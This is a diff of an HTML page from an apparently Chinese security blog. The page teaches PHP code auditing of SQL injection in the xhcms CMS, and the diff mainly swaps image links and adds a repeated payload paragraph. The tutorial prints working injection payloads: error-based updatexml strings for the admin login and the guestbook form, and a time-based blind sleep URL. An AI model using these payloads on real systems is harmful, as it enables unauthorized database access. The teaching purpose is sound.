@@ -476,7 +476,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    1.8k
                 </div>
                 
 
@@ -607,23 +607,27 @@ echo &quot;查询的语句是：$sql&quot;;
 <p>首先我们审计对传入的参数如果想快速的看是否有全局过滤，不妨找个文件输出一下<code>$_POST</code>、<code>$_GET</code>等等。</p>
 <pre><code>echo $_POST[&#39;b&#39;];
 echo $_GET[&#39;a&#39;];
-</code></pre><p><img src="./img/1.2.1.png" alt="file"></p>
+</code></pre><p><img src="https://img-blog.csdnimg.cn/20200401193112186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p>
 <p>没有全局过滤 我们来到后台登陆文件admin/files/login.php 看看login.php一般登陆存在注入的可能性还是很大的</p>
-<p><img src="./img/1.2.2.png" alt="file"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200401193137702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p>
 <p>很明显 带入查询的user没有经过任何过滤，同时输出了错误，所以可以用报错查询，当然你也选择万能密码。</p>
 <p>payload:</p>
 <pre><code>user=1111&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- +&amp;password=111&amp;login=yes
-</code></pre><p><img src="./img/1.2.3.png" alt="file"></p>
+</code></pre><p><img src="https://img-blog.csdnimg.cn/20200401193211841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p>
 <p>在看看留言板 files/submit.php </p>
-<p><img src="./img/1.2.4.png" alt="file"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200401193236645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p>
 <p>传入参数没有过滤</p>
-<p><img src="./img/1.2.5.png" alt="file"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200401193257375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p>
 <p>同时插入的时候，这里使用了<code>mysql_error()</code>所以可以用报错注入，否则只能使用盲注了。</p>
-<p><img src="./img/1.2.6.png" alt="file"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200401193314316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p>
 <p>payload:</p>
 <pre><code>cid=0&amp;name=&#39;or updatexml(1,concat(0x7e,(version())),0) or&#39;&amp;mail=1111&amp;url=http%3A%2F%2F1&amp;content=%E9%98%BF%E5%BE%B7&amp;save=%E6%8F%90%E4%BA%A4&amp;randcode=&amp;jz=1&amp;tz=1</code></pre><p>开始我们说过不是使用了过滤函数就万事大吉了，数字型注入可以不使用引号</p>
-<p><img src="./img/1.2.7.png" alt="file"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200401193333135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p>
 <p>我们看到传入的<code>cid</code>已经被<code>addslashes()</code>函数转义了，查询的地方都没啥问题，但是到浏览计数的时候调用了它，那么我们就可以使用盲注或者报错注入了，因为有错误回显。</p>
+<p>payload：</p>
+<pre><code>http://127.0.0.1/xhcms/?r=content&amp;cid=1%20and%20If(ascii(substr(database(),1,1))%3C10,0,sleep(10))
+</code></pre><p>这个系统还有其他注入，想练手的自己下载审计一下，总体思路有用户交互的地方都有可能存在注入，这也是我们没有通读代码的一个审计思路。</p>
+<p>就可以使用盲注或者报错注入了，因为有错误回显。</p>
 <p>payload：</p>
 <pre><code>http://127.0.0.1/xhcms/?r=content&amp;cid=1%20and%20If(ascii(substr(database(),1,1))%3C10,0,sleep(10))
 </code></pre><p>这个系统还有其他注入，想练手的自己下载审计一下，总体思路有用户交互的地方都有可能存在注入，这也是我们没有通读代码的一个审计思路。</p>
@@ -1166,19 +1170,20 @@ echo $_GET[&#39;a&#39;];
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/040118672.html">
+                <a href="/2020/040117605.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="反序列化审计">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="代码执行审计">
                         
-                        <span class="card-title">反序列化审计</span>
+                        <span class="card-title">代码执行审计</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x00 简介本文章来自 公众号：404安全PHP反序列化漏洞，在我们使用unserialize()进行反序列化的时候，如果反序列化对象中存在一些我们可以利用的魔法函数且传入的变量可控，那么这个过程就可能触发这个魔法函数，来执行我们想要的过
+                            0x00 简介本文章来自 公众号：404安全
+代码执行也是我们经常遇到的，通常是eval()、assert()，当然还有回调函数比如call_user_func() array_map()，正则函数，动态调用等等，因为程序对传入的参数过滤不
                         
                     </div>
                     <div class="publish-info">
@@ -1429,7 +1434,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">18.6k</span>&nbsp;字
+                class="white-color">18.7k</span>&nbsp;字
             
             
             
